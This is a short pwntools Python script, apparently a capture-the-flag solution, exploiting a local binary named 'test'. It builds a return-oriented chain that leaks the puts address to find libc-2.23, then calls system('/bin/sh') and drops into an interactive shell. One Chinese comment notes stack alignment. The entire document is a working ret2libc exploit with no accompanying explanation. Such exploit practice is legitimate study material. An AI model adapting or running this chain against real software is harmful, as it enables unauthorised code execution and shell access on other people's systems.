from pwn import *

s = process("./test")
elf = ELF("./test")

pop_rdi = 0x04006d3
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = 0x400506

for i in range(11):
    s.sendline(str(i))

s.sendline("+")
s.sendline("9") # any number , leave 时 mov rsp,rbp; pop rbp 会使用一个地址需要手动对齐栈
s.sendline(str(pop_rdi))
s.sendline(str(puts_got))
s.sendline(str(puts_plt))
s.sendline(str(main))

for i in range(3):
    s.sendline(str(main))
s.recvline()
puts = u64(s.recv(6).ljust(8, b'\x00'))
success(hex(puts))
libc = ELF("./libc-2.23.so")
offset = puts - libc.sym["puts"]
system = libc.sym["system"] + offset
sh = next(libc.search(b"/bin/sh")) + offset

for i in range(12):
    s.sendline("+")

s.sendline("+")
s.sendline(str(pop_rdi))
s.sendline(str(sh))
s.sendline(str(system))
s.sendline(str(main))
for i in range(3):
    s.sendline(str(main))

s.interactive()
